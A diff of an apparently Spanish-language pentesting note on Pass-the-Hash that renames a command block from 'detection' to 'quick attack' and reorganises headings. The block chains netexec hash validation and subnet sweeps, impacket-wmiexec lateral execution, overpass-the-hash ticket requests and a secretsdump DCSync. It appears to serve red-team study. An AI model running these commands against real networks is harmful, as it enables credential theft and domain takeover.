@@ -40,7 +40,32 @@ linked:
 
 ## Cheatsheet
 
-### 🔑 Hash Sources & Formats
+### 1. Ataque Rápido (TL;DR)
+
+```bash
+# 1. Validate hash + auth
+NT="aabbccdd1122334455..."
+nxc smb 10.10.10.5 -u atacante -H $NT
+
+# 2. Hash reuse subnet sweep
+nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"
+
+# 3. Lateral RCE
+impacket-wmiexec -hashes :$NT corp.local/atacante@10.10.10.5
+
+# 4. Overpass-the-Hash → TGT
+impacket-getTGT corp.local/atacante -hashes :$NT -dc-ip 10.10.10.10
+export KRB5CCNAME=atacante.ccache
+
+# 5. DCSync con hash
+impacket-secretsdump corp.local/atacante@10.10.10.10 -hashes :$NT -just-dc
+```
+
+---
+
+### 2. Explotación
+
+#### 🔑 Hash Sources & Formats
 
 ````tabs
 tab: **Hash Format**
@@ -65,7 +90,7 @@ tab: **Cached Credentials (mscash)**
 ![[Pass-the-Hash - Hash Sources y Formats#^pth-mscash]]
 ````
 
-### 🚀 SMB Lateral
+#### 🚀 SMB Lateral
 
 ````tabs
 tab: **netexec / crackmapexec**
@@ -93,7 +118,7 @@ tab: **Pre-PtH Validation**
 ![[Pass-the-Hash - SMB Lateral#^pth-smb-validate]]
 ````
 
-### 🖥️ WinRM y RDP
+#### 🖥️ WinRM y RDP
 
 ````tabs
 tab: **evil-winrm (Linux)**
@@ -121,7 +146,7 @@ tab: **Common Errors**
 ![[Pass-the-Hash - WinRM y RDP#^pth-winrm-errors]]
 ````
 
-### 💉 Mimikatz Injection
+#### 💉 Mimikatz Injection
 
 ````tabs
 tab: **sekurlsa::pth Basic**
@@ -146,7 +171,7 @@ tab: **Common Errors**
 ![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-errors]]
 ````
 
-### 🎫 Overpass-the-Hash & Spray
+#### 🎫 Overpass-the-Hash & Spray
 
 ````tabs
 tab: **Overpass-the-Hash Concept**
@@ -177,7 +202,7 @@ tab: **Common Errors**
 ![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-errors]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **netexec / crackmapexec**
@@ -272,29 +297,6 @@ tab: **Recursos**
 7. Cleanup:
    - klist purge
    - Close injected processes
-```
-
----
-
-## Detección rápida
-
-```bash
-# 1. Validate hash + auth
-NT="aabbccdd1122334455..."
-nxc smb 10.10.10.5 -u atacante -H $NT
-
-# 2. Hash reuse subnet sweep
-nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"
-
-# 3. Lateral RCE
-impacket-wmiexec -hashes :$NT corp.local/atacante@10.10.10.5
-
-# 4. Overpass-the-Hash → TGT
-impacket-getTGT corp.local/atacante -hashes :$NT -dc-ip 10.10.10.10
-export KRB5CCNAME=atacante.ccache
-
-# 5. DCSync con hash
-impacket-secretsdump corp.local/atacante@10.10.10.10 -hashes :$NT -just-dc
 ```
 
 ---
